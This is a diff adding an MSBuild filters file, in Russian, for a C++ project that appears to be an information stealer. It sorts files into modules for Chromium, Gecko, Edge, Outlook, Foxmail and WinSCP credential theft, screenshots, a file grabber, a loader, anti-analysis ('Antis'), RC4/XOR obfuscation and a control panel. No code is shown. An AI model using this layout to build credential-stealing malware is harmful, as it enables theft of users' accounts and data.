@@ -1,0 +1,230 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Исходные файлы">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Файлы заголовков">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="DynImport">
+      <UniqueIdentifier>{ec806024-d3f4-470c-99cd-7c778998f753}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="DbHandlers">
+      <UniqueIdentifier>{60f100c8-b52a-4a6d-9fa3-96717451cc8a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Loader">
+      <UniqueIdentifier>{b780e97a-a8b8-49d1-816c-3f02360299b7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Crypto">
+      <UniqueIdentifier>{4335741d-d574-41bd-9891-18c062299909}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Crypto\Base64">
+      <UniqueIdentifier>{65cfcfbd-133d-4241-afd4-52584dd1a3d2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Utils">
+      <UniqueIdentifier>{5d39d3e2-2ab7-45a8-8416-4badde5fb704}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Crypto\RC4">
+      <UniqueIdentifier>{985042c7-c20f-473d-a6fb-28c8ad844f5e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer">
+      <UniqueIdentifier>{2f92d84b-ff23-49a3-aa6a-7be7dea417b1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Edge">
+      <UniqueIdentifier>{43e1f75b-5707-413d-a79a-b194bdb4d382}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Screenshot">
+      <UniqueIdentifier>{b8a99e9a-b81c-4b48-bcaf-36a2b95b6400}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\WinSCP">
+      <UniqueIdentifier>{a4212cc8-1268-4962-b9ff-e9beead3cfcd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Foxmail">
+      <UniqueIdentifier>{de0b7408-8e21-4fca-b939-f36e3d9bc7f5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Outlook">
+      <UniqueIdentifier>{f8d34487-bdb6-46be-86c4-ae5c013b63cc}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\SysInfo">
+      <UniqueIdentifier>{bc864905-ebe1-40d5-a18f-e5935e0c4f8b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="FileGrabber">
+      <UniqueIdentifier>{53d9c2af-c9ac-420d-8668-de7e03792693}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="HTTP">
+      <UniqueIdentifier>{b58f103e-9c3d-4d74-b056-a22e9de96197}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Chromium">
+      <UniqueIdentifier>{ab98f178-614c-4109-97bc-9a786c1fba50}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Antis">
+      <UniqueIdentifier>{2b8b2b99-09e0-4822-b1a9-60fc66cbed5d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="DbHandlers\SQL">
+      <UniqueIdentifier>{ad4a1700-13b2-4435-91bf-326972534e20}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Panel">
+      <UniqueIdentifier>{13b98b92-611f-4c7f-94a0-910045e0ce1c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Stealer\Gecko">
+      <UniqueIdentifier>{7c4a2063-1b78-430e-9994-a2a53578691f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Crypto\CRC32">
+      <UniqueIdentifier>{a3a84f44-b716-4a93-8583-5db14f9831c8}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Main.cpp">
+      <Filter>Исходные файлы</Filter>
+    </ClCompile>
+    <ClCompile Include="DynImport.cpp">
+      <Filter>DynImport</Filter>
+    </ClCompile>
+    <ClCompile Include="Loader.cpp">
+      <Filter>Loader</Filter>
+    </ClCompile>
+    <ClCompile Include="Stealing.cpp">
+      <Filter>Исходные файлы</Filter>
+    </ClCompile>
+    <ClCompile Include="Base64.cpp">
+      <Filter>Crypto\Base64</Filter>
+    </ClCompile>
+    <ClCompile Include="Utils.cpp">
+      <Filter>Utils</Filter>
+    </ClCompile>
+    <ClCompile Include="RC4.cpp">
+      <Filter>Crypto\RC4</Filter>
+    </ClCompile>
+    <ClCompile Include="Screenshot.cpp">
+      <Filter>Stealer\Screenshot</Filter>
+    </ClCompile>
+    <ClCompile Include="WinSCP.cpp">
+      <Filter>Stealer\WinSCP</Filter>
+    </ClCompile>
+    <ClCompile Include="Foxmail.cpp">
+      <Filter>Stealer\Foxmail</Filter>
+    </ClCompile>
+    <ClCompile Include="Outlook.cpp">
+      <Filter>Stealer\Outlook</Filter>
+    </ClCompile>
+    <ClCompile Include="SysInfo.cpp">
+      <Filter>Stealer\SysInfo</Filter>
+    </ClCompile>
+    <ClCompile Include="FileGrabber.cpp">
+      <Filter>FileGrabber</Filter>
+    </ClCompile>
+    <ClCompile Include="HTTP.cpp">
+      <Filter>HTTP</Filter>
+    </ClCompile>
+    <ClCompile Include="Chromium.cpp">
+      <Filter>Stealer\Chromium</Filter>
+    </ClCompile>
+    <ClCompile Include="Antis.cpp">
+      <Filter>Antis</Filter>
+    </ClCompile>
+    <ClCompile Include="SqlHandler.cpp">
+      <Filter>DbHandlers\SQL</Filter>
+    </ClCompile>
+    <ClCompile Include="BitmapType.cpp">
+      <Filter>Stealer\Screenshot</Filter>
+    </ClCompile>
+    <ClCompile Include="Panel.cpp">
+      <Filter>Panel</Filter>
+    </ClCompile>
+    <ClCompile Include="Enc.cpp">
+      <Filter>Panel</Filter>
+    </ClCompile>
+    <ClCompile Include="Gecko.cpp">
+      <Filter>Stealer\Gecko</Filter>
+    </ClCompile>
+    <ClCompile Include="Edge.cpp">
+      <Filter>Stealer\Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="CRC32.cpp">
+      <Filter>Crypto\CRC32</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Common.h">
+      <Filter>Файлы заголовков</Filter>
+    </ClInclude>
+    <ClInclude Include="DynImport.h">
+      <Filter>DynImport</Filter>
+    </ClInclude>
+    <ClInclude Include="Loader.h">
+      <Filter>Loader</Filter>
+    </ClInclude>
+    <ClInclude Include="Stealing.h">
+      <Filter>Файлы заголовков</Filter>
+    </ClInclude>
+    <ClInclude Include="Base64.h">
+      <Filter>Crypto\Base64</Filter>
+    </ClInclude>
+    <ClInclude Include="xor.h">
+      <Filter>Crypto</Filter>
+    </ClInclude>
+    <ClInclude Include="Utils.h">
+      <Filter>Utils</Filter>
+    </ClInclude>
+    <ClInclude Include="RC4.h">
+      <Filter>Crypto\RC4</Filter>
+    </ClInclude>
+    <ClInclude Include="Screenshot.h">
+      <Filter>Stealer\Screenshot</Filter>
+    </ClInclude>
+    <ClInclude Include="WinSCP.h">
+      <Filter>Stealer\WinSCP</Filter>
+    </ClInclude>
+    <ClInclude Include="Foxmail.h">
+      <Filter>Stealer\Foxmail</Filter>
+    </ClInclude>
+    <ClInclude Include="Outlook.h">
+      <Filter>Stealer\Outlook</Filter>
+    </ClInclude>
+    <ClInclude Include="SysInfo.h">
+      <Filter>Stealer\SysInfo</Filter>
+    </ClInclude>
+    <ClInclude Include="FileGrabber.h">
+      <Filter>FileGrabber</Filter>
+    </ClInclude>
+    <ClInclude Include="BitmapType.h">
+      <Filter>Stealer\Screenshot</Filter>
+    </ClInclude>
+    <ClInclude Include="HTTP.h">
+      <Filter>HTTP</Filter>
+    </ClInclude>
+    <ClInclude Include="Chromium.h">
+      <Filter>Stealer\Chromium</Filter>
+    </ClInclude>
+    <ClInclude Include="Antis.h">
+      <Filter>Antis</Filter>
+    </ClInclude>
+    <ClInclude Include="SqlHandler.h">
+      <Filter>DbHandlers\SQL</Filter>
+    </ClInclude>
+    <ClInclude Include="Panel.h">
+      <Filter>Panel</Filter>
+    </ClInclude>
+    <ClInclude Include="Enc.h">
+      <Filter>Panel</Filter>
+    </ClInclude>
+    <ClInclude Include="Gecko.h">
+      <Filter>Stealer\Gecko</Filter>
+    </ClInclude>
+    <ClInclude Include="Debug.h">
+      <Filter>Файлы заголовков</Filter>
+    </ClInclude>
+    <ClInclude Include="Edge.h">
+      <Filter>Stealer\Edge</Filter>
+    </ClInclude>
+    <ClInclude Include="ntddk.h">
+      <Filter>Файлы заголовков</Filter>
+    </ClInclude>
+    <ClInclude Include="CRC32.h">
+      <Filter>Crypto\CRC32</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
